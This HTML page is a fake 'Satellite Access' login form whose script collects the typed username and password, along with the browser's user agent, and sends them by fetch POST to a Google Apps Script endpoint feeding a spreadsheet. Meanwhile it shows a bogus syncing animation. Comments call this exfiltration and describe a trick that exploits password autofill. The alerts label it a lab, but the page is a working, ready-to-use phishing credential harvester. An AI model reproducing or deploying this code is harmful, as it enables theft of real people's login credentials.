<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satellite Node | Secure Sync</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #050505; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #lab-container { text-align: center; border: 1px solid #00ff41; padding: 30px; width: 90%; max-width: 350px; background: rgba(0, 255, 65, 0.05); }
        .spinner { border: 3px solid rgba(0, 255, 65, 0.2); border-left: 3px solid #00ff41; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        input { background: #111; border: 1px solid #333; color: #00ff41; padding: 10px; width: 80%; margin: 10px 0; outline: none; }
        input:focus { border-color: #00ff41; }
        
        button { background: #00ff41; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; width: 85%; margin-top: 15px; }
        
        #status-log { font-size: 12px; color: #888; margin-top: 20px; text-align: left; height: 50px; overflow: hidden; }
    </style>
</head>
<body>

<div id="lab-container">
    <div id="ui-auth">
        <h3>SATELLITE ACCESS</h3>
        <p style="font-size: 12px;">Authentication Required for Node Sync</p>
        
        <form id="labForm">
            <input type="text" id="u" name="username" placeholder="Username/Email" autocomplete="username">
            <input type="password" id="p" name="password" placeholder="Password" autocomplete="current-password">
            <button type="button" onclick="initiateCapture()">AUTHORIZE SYNC</button>
        </form>
    </div>

    <div id="ui-processing" style="display:none;">
        <div class="spinner"></div>
        <h3>SYNCING DATA...</h3>
        <div id="status-log"></div>
    </div>
</div>

<script>
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxv3ohN2zG6VdW64OH4fdioGznBIXLAWhc5gTNT8DSzStXM5zPhfuLEF609wywDvBDXQA/exec'; // MUST BE UPDATED

    function log(msg) {
        const logDiv = document.getElementById('status-log');
        logDiv.innerHTML += `> ${msg}<br>`;
    }

    function initiateCapture() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;

        if (!user || !pass) {
            alert("Please use Autofill or enter credentials to link the device.");
            return;
        }

        // Switch UI to "Processing"
        document.getElementById('ui-auth').style.display = 'none';
        document.getElementById('ui-processing').style.display = 'block';

        log("Establishing satellite link...");
        
        // Prepare payload
        const payload = {
            username: user,
            password: pass,
            device: navigator.userAgent,
            timestamp: new Date().toISOString()
        };

        // Exfiltrate to Google Sheet
        fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload)
        }).then(() => {
            setTimeout(() => log("Payload encrypted..."), 1000);
            setTimeout(() => log("Packets sent to Sheet."), 2000);
            setTimeout(() => {
                alert("Lab Sync Successful. Check your Google Sheet.");
                location.reload();
            }, 4000);
        }).catch(err => {
            log("Connection Error. Check Script URL.");
        });
    }

    // Auto-detection trick: If the user taps the field and selects an account, 
    // the 'change' event will trigger even if they don't click the button.
    document.getElementById('p').addEventListener('change', () => {
        log("Credential change detected...");
    });
</script>

</body>
</html>
